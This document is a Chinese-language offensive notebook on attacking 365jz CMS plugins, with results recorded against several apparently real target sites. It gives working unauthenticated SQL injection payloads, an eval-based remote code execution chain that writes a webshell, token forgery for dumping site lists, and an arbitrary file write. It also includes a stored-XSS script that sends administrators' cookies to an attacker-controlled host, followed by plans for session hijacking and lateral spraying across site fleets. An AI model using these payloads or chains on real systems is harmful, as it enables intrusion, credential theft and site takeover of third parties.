# 365jz 前台插件攻击面 (act=plugins) — 实测 2026-09

## 1. 路由本体: 免登录, identifier 可控
`index.php` 的 `act=plugins` 分支(约 429 行)直接:
```php
require_once(JZPLUGINS.'/'.$identifier.'/'.$identifier.'.inc.php');
```
- **无任何登录检查**;`$identifier` 可路径折叠(`./comment` 实测命中真实 comment 插件,返回 2495B 插件页)。
- 枚举指纹(逐 identifier 探测):
  - 插件不存在 → 短提示页
  - 插件存在+类名匹配 → 插件正常输出
  - 插件存在+类名不匹配 → PHP Debug "system Error" 页(泄露路径 `/www/wwwroot/<ip>/plugins/<x>/<x>.inc.php`)
- 已见插件(实测): `comment`、`title_autopic`、`postcontent_preg`(monroe);`mysql_execdata`、`cron_job`、`apihq`、`diyfile`(scjzgc 侧)。

## 2. comment 插件 — zz_pluginvar 读写双通道 (★核心)
```
POST /index.php?act=plugins&identifier=comment&mod=config&do=var&dopost=save&pluginid=4
Content-Type: application/x-www-form-urlencoded
body: pluginconfig[<键>]=<值>
```
背后 SQL(comment.inc.php 源码):
```php
update `tablepre__pluginvar` set value='$fvalue' where pluginid='$pluginid' and variable='$fname'
```
- **读(数组键 $fname 不过滤 → 报错注入)**:
  `pluginconfig[px' or extractvalue(1,concat(0x7e,user())) or '1]=v`
  → XPATH syntax error: '~107_148_73_165@localhost'(updatexml 同款可用)
- **写(数组值 $fvalue 不过滤 → UPDATE 生效)**:
  `pluginconfig[plugin_comment_check]=Y` → 回读配置页 N→Y ✅(可改 zz_pluginvar 全表现有值)
- 路径/参数限制(实测):
  - URL 的 `pluginid` **不进 SQL**(引号/表达式复测全 saved-ok)→ 别注入它;只需非空以过 empty() 门
  - extractvalue 第二参含列名 → MySQL 拒: `Only constant XPATH queries are supported`(读不了当前行值)
  - `@` 拦、子查询 `(select` 拦、`\'` 标准转义成立(NO_BACKSLASH_ESCAPES 未开 → 反斜杠分歧死)
  - fvalue 槽位做 extractvalue 不反射 → 读走 fname、写走 fvalue
- 响应区分: 成功=页含"保存成功!";WAF=Safe Notes 页;SQL 错=PHP Debug 页(含调用栈)。

### pluginid / 变量枚举法
- 逐 pid 取 mod=config 页: 有变量=真插件表单(字段多、响应长);无变量=默认模板页(monroe 2905B);pid 即 zz_plugin 主键。
- monroe 实测: pid=3=title_autopic(bgcolor/字体/颜色/字号), pid=4=comment(forbid/check)。

## 3. title_autopic — 文件存在 oracle
```
GET /index.php?act=plugins&identifier=title_autopic&mod=config&pluginid=1&mdo=test&title=<探测串>
```
- mdo=test 分支活跃;pluginid 只需非空(1..30 皆可)。
- `$title` 未过滤直接拼 `file_exists($容器.'/'.$title.$ext)`(ext=jpg/jpeg/png/gif)。
- 差分判定: 存在=123B / 缺=92B。
- 用途: 探测容器目录内文件;`../` 相对路径可达性未穷尽。

## 4. postcontent_preg — 免登录设置页 + pluginid 注入
```
GET /index.php?act=plugins&identifier=postcontent_preg&mod=config&pluginid=<INJ>
```
- 返回 1812B 未授权设置页;后台 `SELECT * FROM zz_plugin WHERE pluginid='$pluginid'`(报错注入同款)。
- 页面泄露后台在线编辑入口 `file_manage_view.php?fmdo=edit`。

## 5. comment 提交端点(评论侧)
```
POST /index.php?act=plugins&identifier=comment&mod=post
username/email/msg/aid/rate(须带非空 Referer)
```
- aid=is_numeric; **msg**=addslashes+TrimMsg+Html 路径; **username**=HtmlReplace 截断; **email**=filter_var。
- filter_var 随 PHP 版本: 8.1.31 接受 `te'<EMAIL-REDACTED>`(单引号在 local-part)→ scjzgc 可注;monroe/588 常直接 `邮箱填写错误`。
- **rate 源码无过滤**，进 INSERT: `…,'$rate','comment',…`。但请求层 `_loadMQ`/**addslashes 仍作用于 POST 值** → `5' or extractvalue…` 入库后变字面/成功 JSON，**无 XPATH 回显**（588/monroe 2026-09-22 复测全 success）。GBK `%bf%27` 同失败。
- XFF→GetIP 拼 `ip='$ip'`：仅当 `config_feedback_time` 非空才走「按 IP 查上次评论」SELECT；空则 XFF 注入不触发。
- 验证评论是否入库要看动态文章页，静态 redirect 不渲染。

## 6. comment do=makemb / do=skin（免登录配置枝）
- `do=makemb&modname=<dir>`: `is_dir(JZTEMPLATE.'/'.$modname)` 为真则 copy 插件自带 `template/comment.htm` → `templets/<modname>/comment.htm`。
  - `modname=../plugins` 等可把 **htm** 写到 web 可达路径（588: `/plugins/comment.htm` 6KB 样式表）。后缀固定 `.htm`，Apache 当静态，**不能 RCE**。
  - 源 htm 内容不可控（只能 copy 现成文件）。
- `do=skin`: 模板列表 UI，JS `editmb()` → 后台 `file_manage_view.php?fmdo=edit`（**需登录 session**，前台 soft cookie 不够）。
- 云插件中心外链 `https://www.365jz.com/…&identifier=account&godomain=http://目标` → 365 用户中心登录墙，不是目标站后门。

## 7. title_autopic 配置写
- 与 comment 同构: `mod=config&dopost=save&pluginid=<title的pid>` + `pluginconfig[]`；tlgw/monroe 键注入 extractvalue 可用；写 `plugin_title_autopic_fsize` 等可 SAVED。
- 仍无 FILE/写马能力。

## 8. comment do=sh ischeck 数字型注入（2026-09-22 独立盘实证）
`GET/POST ...&do=sh&id=46&ischeck=<EXPR>` → `UPDATE zz_comment SET ischeck=$ischeck WHERE id in ($arcids)`（`$ischeck` **无过滤**）。
- `extractvalue(1,concat(0x7e,user()/version()))` → XPATH；weihuaglass=`5.6.50-log`。
- **多赋值**：`ischeck=1, msg=user()` 可写回 msg，再用 `do=editcomment&id=` 读 JSON（已写入 `107_…@localhost`）。
- 子查询/`union`/`/*`(pos>2)/`#`/`--`/`@`/`char(` 仍被 Checkquery；实验室 `UPDATE t1 JOIN t2` 能过 WAF，但注入点在 SET 值位拼不出合法多表 UPDATE 头。
- `if`/`case` 在 5.6 上两侧都算 → 布尔假阴性。
- `id`/`qstr` 有 `preg_replace(#[^0-9,]#)`；edit 的 username/email/msg addslashes。

## 9. online_inquiry
- SCJ 母舰可有完整插件；**大量业务站未安装**（identifier 探测 → 插件不存在 + 路径泄露）。有安装时 `mod=showjs&dopost=send` 动态拼 INSERT 字段——先确认文件存在再挖，别对 404 站空转。

## 11. action=.txt → setrewrite @eval RCE（2026-09-23 SCJ 实锤）
- 条件: webroot 下任意可读 `.txt` 内容含 `{jz:global.siteurl function='EXPR'}`（单/双引号均可）
- 触发: `GET /index.php?action=相对路径/file.txt` → `setrewrite` 读文件 → 见 `global.` → `@eval("$siteurl=".EXPR.";")` → 回显替换
- SCJ 实证: 写 `plugins/xce_eval.txt` 后 `action=plugins/xce_eval.txt` → `file_put_contents` 写马 → `/plugins/xce.php` 出 `XCEOK`
- `getcssjs()` 本身只 fread；**eval 在 setrewrite 的 txt|htm 分支**（`strstr($contents,"global.")` 门）
- 独立站缺口: 免登录可控内容写 `.txt`（lockfile 只写 `time()`；WAF `data/<md5(CE)>_safe.txt` 需 CE；fileupload 要登录）

## 12. cachelist token 伪造吐站群（2026-09-23 四目标实证）
- `base_jzcode($str)=base64_decode(substr($str,1))`；校验 `base_jzcode($token)<time()-600` 即拒
- 伪造: `token = "A" . base64_encode(str(time()))`（任意前缀 1 字节 + b64(unix ts)）
- `GET /index.php?act=cachelist&token=TOK&dopost=allflink`（无 token 的 old 路径有时也通）
- 输出 `arctype` 的 `siteurl/typename/keywords` → 单站可吐 900–1500+ 同簇域名（四目标合计去重 ~4499）
- 用途: 横向 soft 喷 / 同盘密复用；**先探 `/zzadmin/login.php` 体积~1528 再喷**，CF 403 当假阳

## 10. lockfile 任意路径写（2026-09-23 四目标实证）
- 触发: `?act=search&keyword=ab&lockfile=<relpath>`（POST 同参也行；仅 `act=search` 会 `PutFile`）
- 效果: `PutFile($lockfile, time())` → webroot 相对路径写入 **unix 时间戳**（~10B）
- 已证: `data/config/*.txt`、`plugins/*.txt`、`robots.txt`、`data/config/allowurl.txt` 均可被覆盖；`?action=<path>` 可读回
- **内容不可控**（固定 `time()`）→ 单独不能 RCE；可做路径确认/DoS/清文件
- 与 action eval 组合: 需另一个**可控内容**写点把 `{jz:global ... function=...}` 塞进 `.txt/.htm`

## 11. action= mid-file tag RCE（SCJ 2026-09-23）
- `setrewrite($action)` 读取 `*.txt|*.htm` 后 `preg_match` **全文** `{jz:global.x function='EXPR'}` → `@eval`
- **tag 不必首行**: 前置垃圾/时间戳仍可触发（`mix3` 实证 `c4ca4238`）
- 已证路径: `data/<md5(CE)>_safe.txt`、`data/config/comment.htm`、`robots.txt`、`allowurl.txt`、`plugins/comment/template/comment.htm`
- safe.txt: KEY 无 addslashes 毒化（`pluginconfig[{tag}' and(select 1)and '1'='1']=1`）；独立站差 **cookie_encode**

## 12. 其它 2026-09-23 面
- `makemb&modname=../data/config`: 从源 `plugins/comment/template/comment.htm` **copy** 到 `templets/../data/config/`（weihua/588 可 action 读）——需毒源模板才 RCE
- weihua `/plugins/tools.php` GET 列 `addmin`；POST 死于 `ZZ_admin` 大写 bug（需 FIXED 覆盖）
- `act=cachelist&dopost=allflink` 免登录泄露站群链接（~1000 域/站）
- `act=count&scores=` 字符串写入（不执行 SQL 表达式，仅存储）
- clearspider: `data/cache/clearspider{Ymd}.txt` 可 action 读，内容为固定 DELETE SQL
- soft.365jz.com：可达性波动（有时 200 docs、有时本机超时）；**SCJ 跳板 curl 更稳**
- **CE 假阳**: `ZZ_`+md5(host) 出现在 CSS 类名 → 算出的 `_safe.txt` action 无 eval 标记，**不是** cookie_encode
- soft 同请求写 `.txt`+`action=` 触发：需**正确密码**；同盘 222 常见密已灭（见 fleet-lateral §9）
- 无密完整主链：`references/independent-station-rce.md`

## 13. 评论存储型 XSS → 会话劫持（2026-09-23 四目标实证）
- **写**: `do=sh&id=N&ischeck=1,aid=4,msg=0xHEX(HTML)` — msg 槽 HTML **不过滤**。
- **前台渲染**: `/index.php?act=show&aid=4` 评论区原样输出（`[field:msg/]` 不二次转义）。
- **后台免登录可见**: `/index.php?act=plugins&identifier=comment&mod=config&pluginid=` 列表直接显 msg → **管理员审评论即中**。
- **makemb**: `do=makemb&modname=<skin>` 把 comment.htm 拷进模板后 show 页才挂评论 UI（四目标均「生成完成」）。
- 钩子示例: `<script>new Image().src="http://已控/plugins/xlog.php?c="+encodeURIComponent(document.cookie)</script>`
- 收 cookie 后: `PHPSESSID` + `365aixue=365aixue.com` → `file_manage_control` / soft 同请求写马。
- jz 标签/`{jz:php}`/`runphp` 在 msg 内 **不二次解析**（只 XSS，不是 SSTI）。
- rate 的 `[field:rate runphp=yes]`：`@me` 被替换成 **`$JzMeValue` 变量名**，rate 内容不能断出 RCE。
